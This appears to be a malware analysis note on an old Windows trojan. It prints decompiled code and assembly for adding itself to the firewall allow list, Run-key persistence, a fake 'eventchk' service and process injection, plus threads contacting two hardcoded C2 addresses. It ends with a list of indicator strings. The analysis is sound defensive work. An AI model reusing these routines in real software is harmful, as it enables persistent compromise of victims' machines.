# [Quick Note] Pseudo code sample 71402c97c9d1f83960b624e57f9e6a44

# Overview
MD5: 71402c97c9d1f83960b624e57f9e6a44 </br>
Trend micro: https://www.trendmicro.com/vinfo/ru/threat-encyclopedia/malware/troj_virumulu.a </br>

This sample very oldest, but a few techniques used on it very usefull to learn malware analysis. This malware targeted on platform Windows 2000, Windows Server 2003, Windows XP (32-bit, 64-bit), Windows Vista (32-bit, 64-bit), Windows 7 (32-bit, 64-bit) because this malware used a few Windows API functions not existed on Windowns 8 or newer (e.g: GetVersionExA).

# Main function
When analysis this malware, can see 2 work flow on this malware. If everything pass condition and run successfully, this malware will create 2 file and spawn this into process memory of another services. If everything failed, this malware still drop backdoor and manually establish connection with C2 </br>

## 1. Work flow 1 (everything run successfully)
Firstly, main functions using a few functions (e.g: GetVersionExA, GetSystemDirectoryA, GetModuleFileNameA) to collect OS version, sytem directory, ... to used provide for function ```f_create_and_set_attribute_files``` to do create, set attribute for files. </br>
After created files done, malware setup registry ```system\\controlset001\\services\\sharedaccess\\parameters\\firewallpolicy\\standardprofile\\authorizedapplications\\list``` with value ```:*:Enabled:@xpsp2res.dll,-22001``` append with path of malware to bypass firewall open any connection with malware. </br>
```
// write access to const memory has been detected, the output may be wrong!
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  v9 = lpCmdLine;
  WSAStartup(0x101u, &WSAData);                 // The WSAStartup function initiates use of the Winsock DLL by a process.
  VersionInformation.dwOSVersionInfoSize = 148;
  GetVersionExA(&VersionInformation);           // Identifying the current operating system
  if ( VersionInformation.dwPlatformId != 2 )
    dword_46C000 = 0;
  Filename = 0;
  memset(&v16, 0, 0x103u);
  GetSystemDirectoryA(&Buffer, 0x104u);         // Retrieves the path of the system directory. The system directory contains system files such as dynamic-link libraries and drivers.
  GetWindowsDirectoryA(byte_46D350, 0x104u);    // Retrieves the path of the Windows directory.
  GetModuleFileNameA(0, &Filename, 0x103u);     // Retrieves the fully qualified path for the file that contains the specified module. The module must have been loaded by the current process.
  f_create_and_set_attribute_files(&Filename);  // create and set attribute for file name
  memset(&v14, 0, 0x103u);
  strcpy(
    &SubKey,
    "system\\controlset001\\services\\sharedaccess\\parameters\\firewallpolicy\\standardprofile\\authorizedapplications\\list");
  strcpy((char *)&Data, &BinaryPathName);       // copy value BinaryPathName into &Data
  strcat((char *)&Data, ":*:Enabled:@xpsp2res.dll,-22001");// Appends a string. BinaryPathName + ":*:Enabled:@xpsp2res.dll,-22001"
  v4 = strlen((const char *)&Data);             // v4 = length of &Data
  f_create_and_set_regis_2(&SubKey, &BinaryPathName, 1, &Data, v4);
  hSCManager = OpenSCManagerA(0, 0, 0x400F003Fu);// Establishes a connection to the service control manager on the specified computer and opens the specified service control manager database.
  if ( !_stricmp(&Filename, &BinaryPathName) )
  {
    ServiceStartTable.lpServiceName = "eventchk";// Name of service "eventchk"
    ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)f_set_detail_value_of_process;// set up detail values of process
    v7 = 0;
    v8 = 0;
    StartServiceCtrlDispatcherA(&ServiceStartTable);// Connects the main thread of a service process to the service control manager, which causes the thread to be the service control dispatcher thread for the calling process.
  }
  else
  {
    f_create_and_set_regis_for_INETINFO();      // function create two file INETINFO.exe, css and setup registry for INETINFO
    if ( !f_check_and_query_status_service() )
    {
      if ( !(unsigned __int8)f_open_services("eventchk") )
        f_create_services();
      f_query_change_config_services();
    }
    CloseHandle(0);
    v9 = (char *)f_get_process_and_write_data_into_process();
    if ( v9 )
      ((void (*)(void))v9)();
  }
  return 0;
}
```

When setup registry to bypass firewall successfully, malware will call function ```f_create_and_set_regis_for_INETINFO``` this function create 2 files ```INETINFO.exe``` and ```css``` and setup registry for it. </br>
After create two files successfully, functions will set registry ```SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run``` with key name is ```InetInfo``` and data is path store of ```INETINFO.exe``` when setup done it call ```ShellExecuteA``` to execute this file</br>
```
signed int f_create_and_set_regis_for_INETINFO()
{
  v9 = 0;
  hObject = 0;
  strcpy(&FileName, byte_46D350);
  strcpy(&v11, &FileName);                      // copy value of FileName to v11
  strcat(&FileName, "\\INETINFO.exe");          // append string FileName + \\INETINFO.exe
  strcat(&v11, "\\css");                        // append string v11 + \\css
  SetFileAttributesA(&FileName, 0x80u);         // Sets the attributes for a file or directory.
  hFile = CreateFileA(&FileName, 0xC0000000, 3u, 0, 2u, 0x87u, 0);// create file INETINFO.exe
  if ( hFile == (HANDLE)-1 )
    return 1;
  v1 = CreateFileA(&v11, 0x80000000, 1u, 0, 3u, 0x87u, 0);// create file css
  v2 = v1;
  if ( v1 != (HANDLE)-1 )
  {
    nNumberOfBytesToWrite = GetFileSize(v1, 0); // Retrieves the size of the specified file, in bytes.
    v3 = CreateFileMappingA(v2, 0, 2u, 0, 0, 0);// Creates or opens a named or unnamed file mapping object for a specified file.
    hObject = v3;
    if ( v3 )
    {
      v4 = MapViewOfFile(v3, 4u, 0, 0, 0);      // Maps a view of a file mapping into the address space of a calling process.
      if ( v4 )
      {
        WriteFile(hFile, v4, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0);// Writes data to the specified file INETINFO.exe
        v5 = strlen(&FileName);
        strcpy(&SubKey, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        f_create_and_set_regis_2(&SubKey, "InetInfo", 1, (BYTE *)&FileName, v5);// create regis key with name InetInfo and value path store INETINFO.exe
        v9 = 1;
      }
    }
  }
  CloseHandle(hObject);
  CloseHandle(hFile);
  CloseHandle(v2);
  if ( v9 )
    ShellExecuteA(0, "open", &FileName, Parameters, 0, 5);// execute shell open file INETINFO.exe
  return v9;
}
```
After execute dones, this malware will call functions ```f_get_process_and_write_data_into_process``` to get information of process with name ```eventchk``` and spawn data of ```INETINFO.exe``` into process memory of ```eventchk```. That means, when service ```eventchk``` started it trigger start parallel with ```INETINFO.exe``` </br>

## 2. Work flow 2 (everything run failed)
Another point, when malware collect information on victim machine if can't collect malware will triggert setup registry ```SOFTWARE\Microsoft\Windows\CurrentVersion\Run``` with value ```pathmalware + \\inf\\svchost.exe /autorun```  and key name is ```css``` after that will call function ```f_create_and_set_attribute_files``` and setup registry to bypass firewalls.
```
rsrc:0045E238 push    esi             ; size_t
.rsrc:0045E239 lea     eax, [ebp+var_20B]
.rsrc:0045E23F push    ebx             ; int
.rsrc:0045E240 push    eax             ; void *
.rsrc:0045E241 mov     [ebp+SubKey], bl
.rsrc:0045E247 call    _memset
.rsrc:0045E24C lea     eax, [ebp+SubKey]
.rsrc:0045E252 push    offset aSoftwareMicros ; "SOFTWARE\\Microsoft\\Windows\\CurrentVe"...
.rsrc:0045E257 push    eax             ; char *
.rsrc:0045E258 call    _strcpy
.rsrc:0045E25D lea     eax, [ebp+Filename]
.rsrc:0045E263 push    edi             ; char *
.rsrc:0045E264 push    eax             ; char *
.rsrc:0045E265 call    _strcpy
.rsrc:0045E26A lea     eax, [ebp+Filename]
.rsrc:0045E270 push    offset aInfSvchostExeA ; "\\inf\\svchost.exe /autorun"
.rsrc:0045E275 push    eax             ; char *
.rsrc:0045E276 call    _strcat
.rsrc:0045E27B lea     eax, [ebp+Filename]
.rsrc:0045E281 push    eax             ; char *
.rsrc:0045E282 call    _strlen
.rsrc:0045E287 push    eax             ; cbData
.rsrc:0045E288 lea     eax, [ebp+Filename]
.rsrc:0045E28E push    eax             ; lpData
.rsrc:0045E28F push    1               ; int
.rsrc:0045E291 lea     eax, [ebp+SubKey]
.rsrc:0045E297 push    offset aCss_0   ; "css"
.rsrc:0045E29C push    eax             ; lpSubKey
.rsrc:0045E29D call    f_create_and_set_regis_2
.rsrc:0045E2A2 add     esp, 3Ch
```
Can see on main function have a line code compare ```if ( !_stricmp(&Filename, &BinaryPathName) )``` if path of mallware not equal binary path it jump into another block code. </br>
```
.rsrc:0045E388 lea     eax, [ebp+ServiceStartTable]
.rsrc:0045E38E push    eax             ; lpServiceStartTable
.rsrc:0045E38F mov     [ebp+ServiceStartTable.lpServiceName], offset ServiceName ; "eventchk"
.rsrc:0045E399 mov     [ebp+ServiceStartTable.lpServiceProc], offset f_set_detail_value_of_process
.rsrc:0045E3A3 mov     [ebp+var_83C], ebx
.rsrc:0045E3A9 mov     [ebp+var_838], ebx
.rsrc:0045E3AF call    ds:StartServiceCtrlDispatcherA
.rsrc:0045E3B5 jmp     short loc_45E414
```
This block code, set default service name is ```eventchk``` and call function ```f_set_detail_value_of_process``` throught function ```StartServiceCtrlDispatcherA``` </br>
Quick view on function ```f_set_detail_value_of_process```, this function will set detail options of service status but author of malware very tricky to whe checking condition  of ```ServiceStatus.dwCurrentState``` if couldn't set current state of service it call function ```f_drop_backdoor_if_not_set_status_services``` to drop backdoor with another name and manually establish connection with C2. </br>
```
HANDLE f_drop_backdoor_if_not_set_status_services()
{
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)f_setup_logical_drive, 0, 0, 0);
  CreateThread(0, 0, f_create_thread_connect_C2, 0, 0, 0);
  return CreateThread(0, 0, (LPTHREAD_START_ROUTINE)f_setup_registry_for_ckass, 0, 0, 0);
}
```
Quick view on this function, it create 3 thread to call 3 functions ```f_setup_logical_drive``` ```f_create_thread_connect_C2``` ```f_setup_registry_for_ckass```. </br>
```
With f_setup_logical_drive: it using function GetLogicalDrives to setup logical drives for malware
With f_create_thread_connect_C2: it create socket connect and create child thread to establish connection with 2 IP 121.254.231.246, 121.254.231.247 and call funtion f_establish_user_agent_and_send_data to setup data user-agent connection with C2
With f_setup_registry_for_ckass: it setup registry "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App paths\\ckass.exe" with key name "path"
```
Another point, value return of functions ```f_create_and_set_regis_for_INETINFO``` is ```ShellExecuteA(0, "open", &FileName, Parameters, 0, 5);// execute shell open file INETINFO.exe``` with value ```Parameters``` will ```/autorun```. But author of malware have block code to compare this value </br>
```
.rsrc:0045E427
.rsrc:0045E427 loc_45E427:
.rsrc:0045E427 push    offset aAutorun ; "/autorun"
.rsrc:0045E42C push    [ebp+var_834]   ; char *
.rsrc:0045E432 call    __stricmp
.rsrc:0045E437 pop     ecx
.rsrc:0045E438 pop     ecx
.rsrc:0045E439 test    eax, eax
.rsrc:0045E43B jnz     short loc_45E3FF
```
If this value not ```/autorun```, it will trigger call 2 function to ```f_setup_logical_drive``` ```f_create_thread_connect_C2``` to setup logical drive and establish connection manual with C2 </br>

# Interested strings
```
C2: 121.254.231.247, 121.254.231.246

User-agent:
Content-Length: 
Connection: Keep-Alive
Host: 
User-Agent: Mozilla/4.0\r\n
Accept-Encoding: gzip, deflate\r\n
Accept-Language: en-us\r\n
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*\r\n
 HTTP/1.0\r\n
GET

Registry:
InetInfo
\\css
\\INETINFO.exe
:*:Enabled:@xpsp2res.dll,-22001
system\\controlset001\\services\\sharedaccess\\parameters\\firewallpolicy\\standardprofile\\authorizedapplications\\list
/autorun
\\inf\\svchost.exe /autorun
SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App paths\\ckass.exe
path
```


